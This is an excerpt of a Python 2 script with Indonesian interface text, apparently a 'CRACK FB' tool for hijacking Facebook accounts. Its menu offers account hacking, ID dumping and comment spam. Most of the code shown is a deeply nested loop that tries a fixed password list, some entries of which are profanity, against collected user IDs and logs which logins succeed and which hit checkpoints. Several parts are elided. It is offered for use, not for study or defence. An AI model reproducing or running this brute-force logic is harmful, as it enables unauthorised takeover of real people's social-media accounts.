...
def jalan(z):
	for e in z + '\n':
		...
		sys.stdout.flush()
		time.sleep(0.1)
		print "\033[1;97m SELAMAT DATANG :)\033[0m"
		#megetik
import random
import sys
import time
...
mengetik('\033[0;36mHALLO SOBAT SELAMAT DATANG DI TOOLS KAMI :-)')
mengetik('\033[0;36mJANGAN LUPA SEBELUM MENGUNAKAN BACA BISMILLAH')
mengetik('\033[0;36mJANGAN LUPA SUBSCRIBE CHANNEL BANG BADRU🙏🙏🙏')
#########LOGO#########
logo = """
\033[1;92m      
\033[1;92m┏━━━┳━━━┳━━━┳━━━┳┓┏━┓┏━━━┳━━┓
...
\033[1;92m┗━━━┻┛┗━┻┛╋┗┻━━━┻┛┗━┛┗┛╋╋┗━━━┛v N.E.W
\033[1;93m ──────────────────────────────────────────
\033[1;96m         Script by. MUHAMAD BADRU WASIH
\033[1;96m             New Tools CRACK FB
\033[1;96m                 04/01/2021
\033[1;93m ──────────────────────────────────────────"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
def ambil_token():
	...
	os.system('xdg-open https://youtu.be/M_Y8n2I_LXs')
	time.sleep(2)
	masuk()
...
def menu():
	...
	print "\033[0;93m ╔═════════════════════════════════════════╗"
	print "\033[0;97m [\033[0;97m01\033[0;97m]\033[0;97m\033[0;97m Hack Facebook Account"
	print "\033[0;97m [\033[0;97m02\033[0;97m]\033[0;97m\033[0;97m Crack ID Postingan Grup/Teman"
	print "\033[0;97m [\033[0;97m03\033[0;97m]\033[0;97m\033[0;97m Dump ID"
	print "\033[0;97m [\033[0;97m04\033[0;97m]\033[0;97m\033[0;97m Ikuti Saya di Youtube"
	print "\033[0;97m [\033[0;97m05\033[0;97m]\033[0;97m\033[0;97m Ambil ID Lewat Username"
	print "\033[0;97m [\033[0;97m06\033[0;97m]\033[0;97m\033[0;97m Spam Coment"
...
def pilih_indo():
	...
	print "\n\033[0;97m ══════════════════════════════════════════"
	print "\033[0;97m \033[0;40;97m     TO STOP PROCESS,PRESS CTRL+Z "
	print "\033[0;97m ══════════════════════════════════════════"
##### MAIN INDONESIA #####
	def main(arg):
		...
		try:
			...
			if 'access_token' in w:
				...
				if 'www.facebook.com' in w['error_msg']:
					print '\033[0;93m[CP] ' + user + ' • ' + pass1 + ' • ' + c['name']
					...
					w = json.load(data)
					if 'access_token' in w:
						print '\033[0;92m[OK] ' + user + ' • ' + pass2 + ' • ' + c['name']
						oks.append(user)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[0;93m[CP] ' + user + ' • ' + pass2 + ' • ' + c['name']
							cekpoint.append(user)
						else:
							...
							w = json.load(data)
							if 'access_token' in w:
								print '\033[0;92m[OK] ' + user + ' • ' + pass3 + ' • ' + c['name']
								oks.append(user)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[0;93m[CP] ' + user + ' • ' + pass3 + ' • ' + c['name']
									cekpoint.append(user)
								else:
									pass4 = 'sayang'
									...
									if 'access_token' in w:
										...
										if 'www.facebook.com' in w['error_msg']:
											print '\033[0;93m[CP] ' + user + ' • ' + pass4 + ' • ' + c['name']
											cekpoint.append(user)
										else:
											pass5 = 'bangsat'
											...
											if 'access_token' in w:
												...
												if 'www.facebook.com' in w['error_msg']:
													print '\033[0;93m[CP] ' + user + ' • ' + pass5 + ' • ' + c['name']
													cekpoint.append(user)
												else:
													pass6 = 'anjing'
													...
													if 'access_token' in w:
														...
														if 'www.facebook.com' in w['error_msg']:
															print '\033[0;93m[CP] ' + user + ' • ' + pass6 + ' • ' + c['name']
															cekpoint.append(user)
														else:
															pass7 = 'kontol'
															...
															if 'access_token' in w:
																...
																if 'www.facebook.com' in w['error_msg']:
																	print '\033[0;93m[CP] ' + user + ' • ' + pass7 + ' • ' + c['name']
																	cekpoint.append(user)
																else:
																	...
																	if 'access_token' in w:
																		...
																		if 'www.facebook.com' in w['error_msg']:
																			print '\033[0;93m[CP] ' + user + ' • ' + pass8 + ' • ' + c['name']
																			cekpoint.append(user)
